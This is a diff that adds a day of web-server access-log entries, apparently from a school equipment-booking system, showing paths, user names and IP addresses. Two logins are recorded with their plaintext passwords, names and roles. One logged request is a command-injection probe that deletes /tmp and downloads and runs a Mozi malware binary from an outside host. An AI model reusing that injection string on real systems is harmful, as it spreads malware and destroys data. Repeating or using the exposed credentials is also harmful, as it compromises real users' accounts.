@@ -38,3 +38,130 @@
  18:54:57 / Система 1
  18:55:28 / Система 1
  18:55:55 /ctrl Система 1
+ 00:00:58 / undefined undefined
+ 01:00:16 / undefined undefined
+ 01:16:58 / undefined undefined
+ 01:31:24 / undefined undefined
+ 01:42:54 / undefined undefined
+ 02:43:00 / undefined undefined
+ 03:23:43 / undefined undefined
+ 04:14:50 / undefined undefined
+ 05:10:13 / undefined undefined
+ 05:19:44 / undefined undefined
+ 05:39:47 / undefined undefined
+ 05:51:48 / undefined undefined
+ 06:11:06 / undefined undefined
+ 06:11:13 /auth undefined undefined
+ 06:17:46 / undefined undefined
+ 06:32:37 / undefined undefined
+ 06:55:05 / undefined undefined
+ 07:05:52 / undefined undefined
+ 07:35:34 / undefined 205.210.31.242
+ 07:50:33 / undefined undefined
+ 08:33:28 / undefined undefined
+ 08:35:34 / undefined undefined
+ 08:51:47 / undefined 77.232.185.34
+ 08:51:47 /auth undefined 77.232.185.34
+ 08:51:59 /auth undefined 77.232.185.34 
+ login:roma 
+ pass:Fr22264802024ujlf!
+ 08:51:59 
+ id:54 
+ login:roma 
+ pass:Fr22264802024ujlf! 
+ name:Рома Кудрин 
+ subj:Робототехник 
+ role:2
+ 08:52:00 /auth Рома Кудрин 77.232.185.34
+ 08:52:00 / Рома Кудрин 77.232.185.34
+ 08:52:03 / Рома Кудрин 77.232.185.34
+ 08:52:05 /rtake Рома Кудрин 77.232.185.34 
+ kab:2
+ 08:52:09 / Рома Кудрин 77.232.185.34
+ 08:55:25 / Рома Кудрин 77.232.185.34
+ 09:37:19 / undefined undefined
+ 09:37:19 /auth undefined undefined
+ 09:54:47 / undefined 77.232.185.34
+ 09:54:47 /auth undefined 77.232.185.34
+ 09:55:00 /auth undefined 77.232.185.34 
+ login:teacher2 
+ pass:mypass
+ 09:55:00 
+ id:2 
+ login:teacher2 
+ pass:mypass 
+ name:Мёд С.В.  
+ subj:Русский язык 
+ role:0
+ 09:55:01 /auth Мёд С.В.  77.232.185.34
+ 09:55:01 / Мёд С.В.  77.232.185.34
+ 09:55:09 /take Мёд С.В.  77.232.185.34 
+ lapid:23 
+ kab:17
+ 09:55:13 / Мёд С.В.  77.232.185.34
+ 09:58:19 / undefined undefined
+ 10:22:20 / undefined undefined
+ 11:22:55 / undefined undefined
+ 11:27:40 / undefined undefined
+ 11:47:59 / undefined undefined
+ 12:04:46 / undefined 179.43.182.232
+ 12:04:47 /auth undefined 179.43.182.232
+ 12:12:47 / Рома Кудрин 77.232.185.34
+ 12:16:04 / undefined undefined
+ 12:26:47 / undefined undefined
+ 12:56:17 / undefined undefined
+ 13:12:43 / undefined undefined
+ 13:24:08 / undefined undefined
+ 13:26:20 / undefined undefined
+ 13:47:12 / undefined undefined
+ 14:12:27 / undefined undefined
+ 14:19:29 / undefined undefined
+ 15:03:24 / undefined undefined
+ 15:13:47 / undefined undefined
+ 15:14:12 / undefined undefined
+ 15:16:40 / undefined undefined
+ 15:16:41 /auth undefined undefined
+ 15:21:59 / undefined undefined
+ 15:27:09 / undefined undefined
+ 15:47:23 / undefined undefined
+ 16:53:37 / undefined undefined
+ 16:56:50 / undefined undefined
+ 17:02:54 / undefined undefined
+ 18:32:15 / undefined undefined
+ 18:36:24 / undefined undefined
+ 18:37:07 / undefined undefined
+ 18:37:34 / undefined undefined
+ 18:37:35 /auth undefined undefined
+ 18:38:24 / undefined undefined
+ 18:43:12 / undefined undefined
+ 19:02:25 / undefined undefined
+ 19:32:47 /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://175.107.3.149:39515/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js undefined undefined
+ 19:56:41 / undefined undefined
+ 20:10:22 / undefined undefined
+ 20:10:38 / undefined undefined
+ 20:21:25 / undefined undefined
+ 20:27:34 / undefined undefined
+ 20:27:49 / undefined undefined
+ 20:49:42 / undefined undefined
+ 21:13:54 / undefined undefined
+ 21:37:41 / undefined undefined
+ 21:41:11 / undefined undefined
+ 21:48:53 / Система 95.26.102.47
+ 21:48:59 /devs Система 95.26.102.47
+ 21:49:00 /device-activ/24 Система 95.26.102.47
+ 21:49:02 /devs Система 95.26.102.47
+ 21:49:03 /device-activ/24 Система 95.26.102.47
+ 21:49:05 /device-activ/168 Система 95.26.102.47
+ 21:49:25 /device-activ/12 Система 95.26.102.47
+ 21:49:27 /device-activ/6 Система 95.26.102.47
+ 21:49:29 /device-activ/1 Система 95.26.102.47
+ 21:49:30 /device-activ/24 Система 95.26.102.47
+ 21:49:34 /device-activ/720 Система 95.26.102.47
+ 21:49:37 /device-activ/168 Система 95.26.102.47
+ 21:49:38 /device-activ/720 Система 95.26.102.47
+ 21:49:39 /device-activ/168 Система 95.26.102.47
+ 22:05:10 / undefined undefined
+ 22:19:32 / undefined undefined
+ 23:00:54 / undefined undefined
+ 23:10:38 / undefined undefined
+ 23:56:58 / undefined undefined
